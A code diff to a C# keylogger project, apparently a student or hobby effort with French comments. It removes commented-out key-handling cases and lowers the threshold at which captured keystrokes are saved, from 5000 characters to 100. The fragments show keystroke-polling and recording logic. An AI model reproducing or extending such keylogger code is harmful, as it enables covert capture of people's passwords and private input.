@@ -67,6 +67,7 @@ namespace ProjetKeyLogger
 
             while (true) //boucle "infinie" pour avoir le statut des touches en temps réel
             {
+
                 //On test si la touche shift est enfoncée
                 shift = (Control.ModifierKeys & Keys.Shift) == Keys.Shift;
                 //On test si la Majuscule est activé
@@ -107,23 +108,6 @@ namespace ProjetKeyLogger
                                 enregistrement = new Enregistrement();
 
                                 break;
-
-                            ////touche shift
-                            //case 16:
-                            //   // shift = true;
-                            //    break;
-
-                            ////touche majuscule
-                            //case 20:
-                            //    if (majuscule == false)
-                            //    {
-                            //        majuscule = true;
-                            //    }
-                            //    else
-                            //    {
-                            //        majuscule = false;
-                            //    }
-                            //    break;
 
                             //touche effacer
                             case 8:
@@ -222,26 +206,9 @@ namespace ProjetKeyLogger
                             case 144:
                                 break;
 
-                            //l'autre shift
-                            //case 160:
-                            //case 161:
-                            //    shift = true;
-                            //    break;
-
-                            //ctrl
-                            //case 162:
-                            //case 163:
-                            //    ctrl = true;
-                            //    break;
-
                             //alt
                             case 164:
                                 break;
-
-                            //alt gr
-                            //case 165:
-                            //    altgr = true;
-                            //    break;
 
                             case 186:
                             case 187:
@@ -328,7 +295,7 @@ namespace ProjetKeyLogger
                             case 255:
                                 break;
 
-                                //ordre : azertyuiopqsdfghjklmwxcvbn 
+                            //ordre : azertyuiopqsdfghjklmwxcvbn 
                             case 65:
                             case 90:
                             case 69:
@@ -381,7 +348,7 @@ namespace ProjetKeyLogger
 
                     //SI le nombre de caracteres tapés a dépassé la limite
                     //Et si le temps d'innactivité a dépassé 5 minutes
-                    if (nb_caractere_tape > 5000 && (DateTime.Now.Minute - date_dernier_activite.Minute == temps_inactivite_max || DateTime.Now.Minute - date_dernier_activite.Minute - 60 == temps_inactivite_max) )
+                    if (nb_caractere_tape > 100 && (DateTime.Now.Minute - date_dernier_activite.Minute == temps_inactivite_max || DateTime.Now.Minute - date_dernier_activite.Minute - 60 == temps_inactivite_max) )
                     {
                         //On ajoute l'enregistrement a la collection
                         collection_enregistrement.ajouterNew(enregistrement);
